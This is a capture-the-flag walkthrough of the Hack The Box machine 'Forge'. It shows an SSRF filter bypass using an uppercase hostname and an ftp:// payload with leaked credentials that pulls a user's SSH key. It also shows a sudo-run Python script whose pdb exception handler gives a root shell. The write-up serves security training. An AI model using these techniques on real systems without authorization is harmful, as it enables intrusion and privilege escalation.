# Hack The Box: Forge

**Difficulty:** Medium
**OS:** Linux

Forge is a Medium-level Linux machine focused on Server-Side Request Forgery (SSRF) and security misconfigurations in custom scripts. The initial access phase requires bypassing an SSRF filter on an image upload endpoint to interact with an internal administrative API. Through this API, an internal FTP server is accessed to leak a user's SSH key. Privilege escalation involves exploiting a custom Python script that handles socket connections; triggering an exception in the script drops the user into an interactive Python Debugger (PDB) running as root.

---

## Reconnaissance

The assessment begins with a port scan to identify open services on the target.

```bash
nmap -p- --min-rate 10000 10.10.11.111
nmap -p 22,80 -sCV 10.10.11.111
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 80:** HTTP (nginx/1.18.0)

Browsing to port 80 reveals a web application hosting an image gallery. Adding the domain `forge.htb` to the `/etc/hosts` file is necessary for proper routing.

Directory enumeration with `gobuster` or `ffuf` reveals an `/uploads` directory and an interesting subdomain structure. By brute-forcing subdomains or analyzing the application's behavior, we discover an administrative subdomain: `admin.forge.htb`.

Attempting to access `http://admin.forge.htb` directly from the external network returns a `403 Forbidden` error, indicating it is restricted to internal access only.

## Web Exploitation

The main application on `forge.htb` features an "Upload from URL" functionality. This feature accepts a URL, fetches the remote resource, and saves it to the server. This is a classic vector for Server-Side Request Forgery (SSRF).

### Bypassing the SSRF Filter

We attempt to fetch the restricted internal admin panel using the upload feature:

```text
http://admin.forge.htb
```

The application returns an error indicating that the URL contains a blacklisted domain. The application implements a filter to prevent requests to `localhost`, `127.0.0.1`, and the `admin.forge.htb` subdomain.

To bypass this filter, we must use alternative representations of the internal addresses. Common bypass techniques include using short IP addresses, decimal IPs, or alternative domain names that resolve to localhost.

However, since the filter specifically targets `admin.forge.htb`, we can bypass it by using case variations or URL encoding. If the filter is poorly implemented (e.g., matching exact strings rather than resolving and checking the IP), modifying the casing might work.

A successful bypass involves using uppercase characters in the domain name, which the backend DNS resolver treats as identical to lowercase, but which the regex filter fails to catch:

```text
http://ADMIN.FORGE.HTB
```

Submitting this URL successfully bypasses the filter. The server fetches the internal admin page and provides a link to view the "uploaded image," which is actually the HTML response of the internal page.

### Interacting with the Internal API

Reading the fetched HTML reveals the structure of the internal admin panel. The page indicates the presence of an internal API endpoint at `/announcements` and a feature to fetch files via an `/upload` endpoint, which supports the `ftp://` scheme.

We use the SSRF vulnerability to interact with this internal upload endpoint. The HTML source mentions that the internal FTP server requires credentials, and conveniently provides them in the page source or response headers (e.g., `user:heightofsecurity123!`).

We craft a new SSRF payload to connect to the internal FTP server and read files from the filesystem.

```text
http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.0.0.1/.ssh/id_rsa
```

When submitted through the external "Upload from URL" feature, the backend fetches the SSH private key from the internal FTP server. We download the resulting file to retrieve the private key.

## Initial Access

We use the recovered SSH private key to authenticate as the user `user`.

```bash
chmod 600 id_rsa
ssh -i id_rsa user@10.10.11.111
# Authentication successful
```
We retrieve the `user.txt` flag from the home directory.

## Privilege Escalation

Enumerating the system as `user`, we check for commands that can be executed with elevated privileges via `sudo`.

```bash
sudo -l
```

The output indicates that `user` can run a specific Python script as `root` without providing a password.

```text
User user may run the following commands on forge:
    (root) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

### Analyzing the Custom Script

We review the source code of `/opt/remote-manage.py`. The script sets up a local socket listening for connections. It handles incoming data and processes specific commands.

Crucially, the script uses a `try...except` block to handle errors. If an unexpected error occurs during execution, the exception handler invokes `pdb.post_mortem()`.

```python
import pdb
# ... script logic ...
except Exception as e:
    print(e)
    pdb.post_mortem()
```

The Python Debugger (`pdb`) is an interactive console that allows for arbitrary code execution within the context of the running Python process. Since the script is executed via `sudo`, the `pdb` session will run as `root`.

### Triggering the Exception

To exploit this, we open two terminal windows.

In the **first terminal**, we run the script using `sudo`:
```bash
sudo /usr/bin/python3 /opt/remote-manage.py
# The script starts listening on a local port.
```

In the **second terminal**, we connect to the socket using Netcat:
```bash
nc localhost <PORT_NUMBER>
```

We interact with the script and intentionally provide malformed input or trigger a condition that the script fails to handle gracefully (e.g., sending non-ascii characters or interrupting a specific prompt).

When the script encounters the unhandled exception, the first terminal drops into the interactive `pdb` shell.

```text
> /opt/remote-manage.py(27)<module>()
-> pdb.post_mortem()
(Pdb)
```

Within the `pdb` prompt, we can execute arbitrary Python commands to import the `os` module and spawn a root shell.

```text
(Pdb) import os; os.system("/bin/bash")
```

The command executes, granting root access.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```
The machine is fully compromised.
